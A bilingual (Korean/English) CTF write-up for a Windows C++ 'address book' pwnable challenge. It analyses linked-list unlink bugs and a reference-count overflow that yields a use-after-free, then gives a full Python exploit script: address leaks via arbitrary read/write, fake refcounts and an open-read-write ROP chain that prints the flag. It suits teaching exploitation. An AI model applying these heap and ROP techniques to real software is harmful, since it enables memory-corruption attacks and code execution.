## address_book

<details>
<summary>KR</summary>

C++로 작성된 "make note" 스타일의 윈도우 pwnable 문제입니다. 바이너리를 탑다운으로 분석한 결과 다음과 같습니다:

1. `AddressBook`과 `RecycleBin` 두 개의 main object가 0x248 크기로 할당됩니다. `Element` object들의 비순환적인 이중 연결 리스트를 가지고 있습니다.
   ```
   00000000 AddressBook     struc ; (sizeof=0x248, mappedto_50)
   00000000 vtable          dq ?
   00000008 name            dw 268 dup(?)
   00000220 root            DList ?
   00000230 aliveCnt        dd ?
   00000234 allocCnt        dd ?
   00000238 field_238       dq ?
   00000240 field_240       dq ?
   00000248 AddressBook     ends
   
   00000000 DList           struc ; (sizeof=0x10, mappedto_54)
   00000000                                         ; XREF: AddressBook/r
   00000000                                         ; Element/r
   00000000 next            dq ?                    ; head
   00000008 prev            dq ?                    ; tail
   00000010 DList           ends
   ```
2. `Element`는 read()로 입력받는 영역과 (name, address, city) index 번호를 가지며, 마찬가지로 0x248 크기로 할당됩니다.
   ```
   00000000 Element         struc ; (sizeof=0x248, mappedto_53)
   00000000 name            db 16 dup(?)
   00000010 address         db 512 dup(?)
   00000210 city            db 24 dup(?)
   00000228 dlist           DList ?
   00000238 field_238       dq ?
   00000240 idx             dd ?
   00000244 field_244       dd ?
   00000248 Element         ends
   ```
3. Main object들은 reference object를 이용하여 참조 횟수를 계산합니다. 참조가 되면 참조 횟수 값에 10이 더해지며, 참조가 해제되면 거꾸로 10을 뺍니다. 참조를 해제할 때 참조 횟수 값이 10보다 작으면 (signed comparison) 참조되고 있는 object를 free()합니다. 참조 횟수 값은 2바이트 크기의 정수입니다.
4. 메뉴에 7가지 기능이 제공됩니다:
   1. `Add`: 새로운 Element를 만들고 `AddressBook`의 tail에 추가합니다. 최대 101개의 Element를 할당할 수 있습니다.
   2. `List`: `AddressBook`을 재귀적으로 탐색하며 내용을 출력합니다.
   3. `Delete`: `AddressBook`에서 Element 하나를 뽑은 후 `RecycleBin`의 tail에 추가합니다.
   4. `Restore`: `RecycleBin`에서 Element 하나를 복구한 후 (뽑은 후) `AddressBook`에 다시 삽입합니다.
   5. `Modify`: `AddressBook`의 한 Element에 대해 name, address와 city의 값을 수정합니다.
   6. `Empty`: `AddressBook`이나 `RecycleBin` 리스트에 포함된 Element들을 free하며, 관련된 데이터를 0으로 초기화 합니다 (`root`, `aliveCnt`, `allocCnt`).
   7. `Exit`: Main object들을 참조 해제하고 main()에서 리턴합니다.

많은 함수들이 다양한 방법으로 이상하게 동작하는데, 그 몇 가지는 다음과 같습니다:

1. 이중 연결 리스트에서 Element를 뽑아내는 함수가 (`Delete` 와 `Restore`에서 사용) 뽑은 Element의 `prev` or `next` 를 지우지 않고, head를 뽑을 때 `root.next->dlist.prev` 또한 지워지지 않습니다. 뽑으려는 Element가 tail이 아니지만 tail과 같은 `idx` 값을 가지는 경우 생기는 이상한 버그도 있습니다.
2. `Restore` 기능은 복구한 Element를 이상한 위치에 삽입하는데, if-else문에서는 증가하는 `idx` 값을 가지는 리스트를 가정하고 삽입 위치를 탐색하는 함수는 단순히 `idx`가 모여 있는 리스트를 가정하여 발생합니다.
3. `Modify` `idx` 탐색 함수는 그냥 _잘못짜서_ 의도가 뭔지 모르겠네요...

위의 버그들 중 가장 exploitable해 보이는 버그는 첫 번째 버그입니다. 여러 비정상적인 상태를 만들 수 있는데, 예를 들어 `B`를 `RecycleBin` 리스트 `A -> B -> C -> D`에서 뽑은 다음 `AddressBook`의 빈 리스트에 삽입한 결과는 `RecycleBin` 리스트 `A -> C -> D`와 `AddressBook` 리스트 `B -> C -> D`가 됩니다.

위의 버그를 이용하여 `AddressBook`에 순환적인 연결 리스트를 다음과 같은 방식으로 만들 수 있습니다:
```python
for i in range(1, 6):
    add(str(i)+'\n', str(i)+'\n', str(i)+'\n')
for i in range(5, 0, -1):
    data = delete(i)

# Create infinite-looping DList with stray next ptrs
restore(3)
restore(2)
```

이제 참조 횟수 값을 오버플로우 시키는 것이 가능합니다. 기존에는 3000개가 넘는 Element들을 `Add`, `Delete` 후 `Restore`시켜야 가능했다면, 이제는 `List`에 Element 개수만 대략 `0x8000 // 10`개로 제한하여 출력하면 됩니다. 정확한 값을 계산하자면, `3275`개의 Element를 출력하여 3273번째 재귀에서 음수로 오버플로우, 3274번째 재귀에서 거기에다 +10, 그 다음 마지막 재귀인 3275번째 재귀에서 참조가 해제되며 `AddressBook` 힙 주소가 출력되고 정확히 한번 free됩니다.

`AddressBook`이 해제되었으니, `Add` 기능을 이용하여 해제된 그 청크에 `Element`를 할당받을 수 있습니다. 이 방식으로 `vtable`, `name`과 `root.next`를 덮을 수 있는데, 이는 임의 주소에 읽고 쓰기에 충분합니다.

마지막 과정은 다음과 같습니다:
1. `AddressBook`을 덮어 써서 겹치는 `Element`의 리스트를 만듭니다. `AddressBook`의 주소를 `ab`라고 했을 때, `(ab - 0x100) -> (ab - 0x180) -> (target)`을 사용했습니다.
2. `Modify`로 `target`을 원하는 주소로 변경합니다.
3. `List`와 `Modify`로 임의 주소에서 데이터를 읽고 씁니다.
4. 2~3을 통해 ntdll부터 스택 주소까지 필요한 모든 정보를 알아냅니다.
5. 2~3의 임의 쓰기를 통해 참조 횟수 값을 저장하는 가짜 메모리 주소를 만들어 `Exit` 시에 참조 해제를 통한 free를 막습니다.
6. ROP chain을 적고, `Exit`하여 플래그를 출력합니다.

</details>

<details>
<summary>EN</summary>

Windows "make note"-style pwnable chal written in C++. Reversing the binary top to bottom we see:

1. Two main objects, `AddressBook` and `RecycleBin` of size 0x248. These keep an acyclic doubly linked list of `Element`s.
   ```
   00000000 AddressBook     struc ; (sizeof=0x248, mappedto_50)
   00000000 vtable          dq ?
   00000008 name            dw 268 dup(?)
   00000220 root            DList ?
   00000230 aliveCnt        dd ?
   00000234 allocCnt        dd ?
   00000238 field_238       dq ?
   00000240 field_240       dq ?
   00000248 AddressBook     ends
   
   00000000 DList           struc ; (sizeof=0x10, mappedto_54)
   00000000                                         ; XREF: AddressBook/r
   00000000                                         ; Element/r
   00000000 next            dq ?                    ; head
   00000008 prev            dq ?                    ; tail
   00000010 DList           ends
   ```
2. `Element`s are composed of read()-input fields (name, address, city) and an index, with a total size of 0x248.
   ```
   00000000 Element         struc ; (sizeof=0x248, mappedto_53)
   00000000 name            db 16 dup(?)
   00000010 address         db 512 dup(?)
   00000210 city            db 24 dup(?)
   00000228 dlist           DList ?
   00000238 field_238       dq ?
   00000240 idx             dd ?
   00000244 field_244       dd ?
   00000248 Element         ends
   ```
3. Main objects are reference counted with reference objects. Each refs add 10 to the reference count value, and vice versa for derefs. At deref, if refcnt reaches less than 10 (signed comparison) the referenced object is freed. Reference count value is stored as 2-byte sized integer.
4. Menu with 7 functions:
   1. `Add`: Creates a new element and appends it to the tail of `AddressBook`. At most 101 elements are allocatable.
   2. `List`: Recursively traverses `AddressBook` while printing out contents of elements.
   3. `Delete`: Pops an element from `AddressBook` and appends it to the tail of `RecycleBin`.
   4. `Restore`: Restores (Pops) an element from `RecycleBin` and pushes it back to `AddressBook`
   5. `Modify`: Modifies name, address and city of an element from `AddressBook`.
   6. `Empty`: Frees `AddressBook` or `RecycleBin` elements and zeros out related fields (`root`, `aliveCnt`, `allocCnt`).
   7. `Exit`: Derefs main objects and returns from main().

Many functions are malfunctional in diverse ways. Some are listed below:

1. The function which pops out an element from the doubly linked list (used in `Delete` and `Restore`) fails to clean up `prev` or `next` of popped element, as well as `root.next->dlist.prev` when popping head. It even has a weird index confusion bug when the element to be popped is not the tail but has same index as tail.
2. `Restore` function inserts the restored element in a weird position, with the if-else predicates assuming increasing order and the index-finding function assuming a simple grouping by indices.
3. `Modify` index searching function is simply wrong, I dunno what's intended...

From the above bugs, the most exploitable is the first one. It can cause many anomalous states, for example popping `B` from `RecycleBin` list `A -> B -> C -> D` and inserting it to `AddressBook` empty list will result in `RecycleBin` list of `A -> C -> D` and `AddressBook` list of `B -> C -> D`.

Fiddle with the bug to create a cyclic linked list at `AddressBook` as the following code:
```python
for i in range(1, 6):
    add(str(i)+'\n', str(i)+'\n', str(i)+'\n')
for i in range(5, 0, -1):
    data = delete(i)

# Create infinite-looping DList with stray next ptrs
restore(3)
restore(2)
```

Now refcnt overflow is viable - we don't have to add, delete and restore over 3000 elements which was taking eternity, but instead `List` just about `0x8000 // 10` number of elements. Counting the exact number, we can list `3275` elements to overflow to negative at recursion #3273, add another 10 to that at #3274, then deref at #3275 (end of recursion) to leak `AddressBook` heap address and free it just once.

`AddressBook` is freed - use `Add` function to allocate an `Element` located exactly at the freed chunk. This allows overwriting `vtable`, `name` and `root.next` which is enough to get us AAR/W.

These are the final steps:
1. Overwrite `AddressBook` to create `Element` chain with overlapping memory region. Assuming the address of `AddressBook` to be `ab`, I used `(ab - 0x100) -> (ab - 0x180) -> (target)` chain.
2. Use `Modify` to modify `target` to desired address.
3. Use `List` and `Modify` for AAR/W.
4. Repeat steps 2~3 until we leak everything from ntdll base up to stack address.
5. Use steps 2~3 AAW to create fake reference counters to avoid free inside derefs at `Exit`.
6. Write ROP chain, `Exit` and pop out flag.

</details>

<details>
<summary>Exploit Code</summary>

```python
from pwintools import *
from pdbparse.symlookup import Lookup
import os

def inject(pe, sym, name):
    if name not in pe.symbols:
        pe.symbols[name] = next(
            sym.locs[base, limit][sym.names[base, limit].index(name)]
            for base, limit in sym.addrs
            if name in sym.names[base, limit]
        )

binary = PE('./binary.exe')
ntdll = PE('./ntdll.dll')
ucrtbase = PE('./ucrtbase.dll')
ntdll_sym = Lookup([(r'.\ntdll.pdb', 0)])
inject(ntdll, ntdll_sym, 'TlsExpansionBitMap')

os.environ["_NO_DEBUG_HEAP"] = "1"

DEBUG = False
def launch():
    global p
    if DEBUG:
        p = Process('./binary.exe')
    else:
        p = Remote('125.129.121.42', 55555)
        p.timeout = 5000
    p.newline = '\r\n'

def start_debug(wait=True):
    if DEBUG:
        p.timeout = 10000000
        p.spawn_debugger(x96dbg = True, sleep = 3)
        if wait:
            raw_input('continue?')

def menu(sel):
    p.recvuntil('7. Exit\r\n')
    p.recvuntil('> \r\n')
    p.sendline(str(sel))

def add(name, addr, city):
    menu(1)
    p.recvuntil('Name :')
    p.send(name)
    p.recvuntil('Address : ')
    p.send(addr)
    p.recvuntil('City : ')
    p.send(city)
    p.recvuntil('Add complete\r\n')

def lister(cnt, probe_leak=False):
    menu(2)
    p.recvuntil('Enter the number of addresses want to view > ')
    p.sendline(str(cnt))
    p.recvuntil('===== [')
    book_name = p.recvuntil('] Address Book List =====', drop=True)
    
    if probe_leak:
        data = ''
        while 'Number of Address' not in data:
            data = p.recvuntil('Address')
        p.recvuntil('Address Book list saved in ')
        data = int(p.recvline(keepends=False), 16)
        return data
    
    lst = []
    for i in range(cnt):
        p.recvuntil('======Address [')
        idx = int(p.recvuntil(']======', drop=True))
        p.recvuntil('Name : ')
        name = p.recvuntil('\r\nAddress : ', drop=True)
        addr = p.recvuntil('\r\nCity : ', drop=True)
        city = p.recvuntil('\r\n', drop=True)
        lst.append((idx, name, addr, city))
    p.recvuntil('Number of Address : ')
    alive_cnt = int(p.recvline(keepends=False))
    return book_name, alive_cnt, lst

def delete(idx):
    menu(3)
    p.recvuntil('which one you want to delete > ')
    p.sendline(str(idx))
    p.recvuntil('Complete\r\n')
    p.recvuntil('===== Recycle Bin =====')
    # TODO: parse
    return p.recvuntil('\r\n\r\n1. Add address Info', drop=True)

def restore(idx):
    menu(4)
    p.recvuntil('which one you want to restore > ')
    p.sendline(str(idx))
    p.recvuntil('Complete')

def modify(idx, modify_chain):
    menu(5)
    p.sendline(str(idx))
    for sel, data in modify_chain:
        p.recvuntil('> \r\n')
        p.sendline(str(sel))
        if sel == 4:
            break
        p.recvuntil('new ')
        p.recvuntil(' : ')
        p.send(data)

def empty(sel):
    menu(6)
    p.recvuntil('2. Empty Recycle Bin\r\n>')
    p.sendline(str(sel))

def exiter():
    menu(7)

launch()

p.recvuntil('Input Address Book Name > \r\n')
p.send('aaaa\n')

for i in range(1, 6):
    add(str(i)+'\n', str(i)+'\n', str(i)+'\n')
for i in range(5, 0, -1):
    data = delete(i)

# Create infinite-looping DList with stray next ptrs
restore(3)
restore(2)

book = lister(3275, True)  # just enough to overflow once
log.success('book: {:016x}'.format(book))
rbin = book + 0x250
log.info('rbin: {:016x}'.format(rbin))

# Prepare fake Elements structures
payload  = 'A'*0x98
payload += 'ZZZZZZZZ'
payload  = payload.ljust(-0x110 + 0x228, 'B')
payload += p64(book - 0x180) + 'C'*0x10 + p32(0x13371337)
payload  = payload.ljust(0x200, 'D')

# Add at AddressBook, immediately overwritting root.next (head)
add('AAAA\n', payload, 'A'*0x10+p64(book - 0x100))

fakerefs = book - 0x100 + 0x10, book - 0x100 + 0x10 + 4
def set_addr(addr):
    payload  = p32(0x3030) + p32(0x3030) # fakerefs, avoid Deref()s at main() ret
    payload  = payload.ljust(0x198, 'D')
    payload += p64(addr - 0x10)  # use lst[2][2]
    payload += 'C'*0x10 + p32(0x13371337)
    payload  = payload.ljust(0x200, '!')
    modify(1, [(2, payload), (4, None)])

set_addr(rbin)
_, _, lst = lister(3)
binary.base = u64(lst[2][2].ljust(8, '\0')) - 0x6960
assert(binary.base & 0xffff == 0)
log.success('binary: {:016x}'.format(binary.base))

set_addr(binary.base + 0x6060)
_, _, lst = lister(3)
ntdll.base = u64(lst[2][2].ljust(8, '\0')) - ntdll.symbols['RtlInitializeSListHead']
assert(ntdll.base & 0xffff == 0)
log.success('ntdll: {:016x}'.format(ntdll.base))

set_addr(binary.base + 0x62e0)
_, _, lst = lister(3)
ucrtbase.base = u64(lst[2][2].ljust(8, '\0')) - ucrtbase.symbols['_sopen_dispatch']
assert(ucrtbase.base & 0xffff == 0)
log.success('ucrtbase: {:016x}'.format(ucrtbase.base))

set_addr(ntdll.base + ntdll.symbols['TlsExpansionBitMap'] + 8)
_, _, lst = lister(3)
peb = u64(lst[2][2].ljust(8, '\0')) - 0x240
assert(peb & 0xfff == 0)
log.success('peb: {:016x}'.format(peb))

teb = peb + 0x1000
set_addr(teb + 0x8 + 2)
_, _, lst = lister(3)
stack_base = u64(('\0\0' + lst[2][2]).ljust(8, '\0'))
assert(stack_base & 0xffff == 0)
log.success('stack_base:  {:016x}'.format(stack_base))

set_addr(teb + 0x10 + 2)
_, _, lst = lister(3)
stack_limit = u64(('\0\0' + lst[2][2]).ljust(8, '\0'))
assert(stack_limit & 0xfff == 0)
log.success('stack_limit: {:016x}'.format(stack_limit))

probe = stack_base - 0xd8 - 0x200
ret_pattern = binary.base + 0x4584
log.info('Probing for pattern {:016x}...'.format(ret_pattern))
for i in range(0x200):
    log.info('probe #0x{:03x} @ {:016x}'.format(i, probe))
    set_addr(probe)
    _, _, lst = lister(3)
    leak = u64(lst[2][3].ljust(8, '\0'))
    if leak == ret_pattern:
        assert i >= 0x10  # space for rop
        break
    probe -= 0x10
ret_addr = probe + 0x200
log.success('ret@stack: {:016x}'.format(ret_addr))

# binObj:  -188h => write at -180h
# bookObj: -1c0h => write at -1b8h
refs = ret_addr - 0x180, ret_addr - 0x1b8
log.info('fake refcnt @ {:016x} and {:016x}'.format(refs[0], refs[1]))

for i in range(2):
    set_addr(refs[i])
    modify(0x13371337, [(2, p64(fakerefs[i])+'\n'), (4, None)])

"""
ntdll based
0x0000000180001029 : ret
0x000000018008df3f : pop rcx ; ret
0x000000018008b8f7 : pop rdx ; pop r11 ; ret
0x00000001800069d3 : pop r8 ; ret
0x0000000180003edc : add rsp, 0x28 ; ret

ROP Chain: classic open-read-write (+sleep)
"""

buf = book
rop = ''.join([
    p64(ntdll.base + 0x8df3f),  # ..8
    p64(3),
    p64(ntdll.base + 0x8b8f7),
    p64(buf),
    p64(0),
    p64(ntdll.base + 0x69d3),
    p64(0x100),
    p64(ucrtbase.base + ucrtbase.symbols['_read']),
    p64(ntdll.base + 0x3edc),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(ntdll.base + 0x8df3f),
    p64(1),
    p64(ntdll.base + 0x8b8f7),
    p64(buf),
    p64(0),
    p64(ntdll.base + 0x69d3),
    p64(0x100),
    p64(ucrtbase.base + ucrtbase.symbols['_write']),
    p64(ntdll.base + 0x3edc),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(0),
    p64(ntdll.base + 0x8df3f),
    p64(0xffffffff),
    p64(ntdll.base + 0x1029),
    p64(ucrtbase.base + ucrtbase.symbols['_sleep']),
])  # and some trailing shadow space

start_debug()

assert len(rop) < 0x200
assert '\n' not in rop

set_addr(ret_addr)
modify(0x13371337, [(2, rop+'\n'), (4, None)])

exiter()

p.recvuntil('XMAS{')

flag = 'XMAS{' + p.recvuntil('}')
print(flag)
```

</details>

Flag: `XMAS{1$_y0ur_@ddr3ss_1n_s4nt4s_addr3ss_b00k?}`